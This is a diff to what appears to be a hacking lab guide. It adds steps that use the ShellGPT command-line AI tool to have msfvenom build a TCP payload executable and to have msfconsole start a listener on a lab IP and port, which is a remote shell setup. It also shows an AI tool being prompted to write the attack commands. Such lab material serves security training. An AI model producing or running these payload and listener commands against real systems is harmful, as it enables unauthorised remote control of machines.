@@ -1208,5 +1208,13 @@ It’s basically a wrapper around the OpenAI API.
 <summary>Perform System Hacking using AI</summary>
 
 * Perform System Hacking using ShellGPT :~
-  - 
+  - after activation of the sgpt in the terminal window run 
+    ```console
+        sgpt --shell "Use msfvenom to create a TCP payload with lhost=10.10.1.13 and lport=444"
+    ```
+  - run ls command to display a list of files in the directory and you can observe a file named as payload.exe has been created
+  - initialize listener on the given LHOST and LPORT
+    ```console
+        sgpt --shell "Use msfconsole to start a listener with lhost=10.10.1.13 and lport=444"
+    ```    
 </details>
